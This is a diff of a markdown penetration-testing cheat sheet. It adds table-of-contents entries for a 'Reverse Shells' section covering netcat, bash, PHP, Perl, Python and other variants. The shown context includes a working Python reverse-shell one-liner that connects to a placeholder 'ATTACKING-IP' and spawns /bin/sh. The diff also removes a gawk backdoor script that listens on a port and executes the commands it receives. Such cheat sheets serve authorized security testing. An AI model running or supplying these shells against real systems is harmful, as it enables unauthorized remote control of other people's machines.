@@ -25,6 +25,20 @@ This penetration cheat sheet should be used as a quick reference overview for va
         - [Oracle](#oracle)
         - [MSSQL](#mssql)    
 - [Network](#network)
+- [Reverse Shells](#reverse-shells)
+    - [Setting up a Reverse Shell](#setting-up-a-reverse-shell)
+        - [Listener on local machine](#listener-on-local-machine)
+        - [Netcat Reverse Shell](#netcat-reverse-shell)
+        - [Bash Reverse Shell](#bash-reverse-shell)
+        - [PHP Reverse Shell](#php-reverse-shell)
+        - [Telnet Reverse Shell](#telnet-reverse-shell)
+        - [Perl Reverse Shell](#perl-reverse-shell)
+        - [Ruby Reverse Shell](#ruby-reverse-shell)
+        - [Java Reverse Shell](#java-reverse-shell)
+        - [Python Reverse Shell](#python-reverse-shell)
+    - [Kali Reverse Shell](#kali-reverse-shell)        
+                
+        
 
 
 # Pre-engagement
@@ -230,27 +244,6 @@ p.waitFor()`
 
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-### Gawk Reverse Shell
 
-`#!/usr/bin/gawk -f
-
-BEGIN {
-        Port    =       8080
-        Prompt  =       "bkd> "
-
-        Service = "/inet/tcp/" Port "/0/0"
-        while (1) {
-                do {
-                        printf Prompt |& Service
-                        Service |& getline cmd
-                        if (cmd) {
-                                while ((cmd |& getline) > 0)
-                                        print $0 |& Service
-                                close(cmd)
-                        }
-                } while (cmd != "exit")
-                close(Service)
-        }
-}`
-
+## Kali Reverse Shell
 
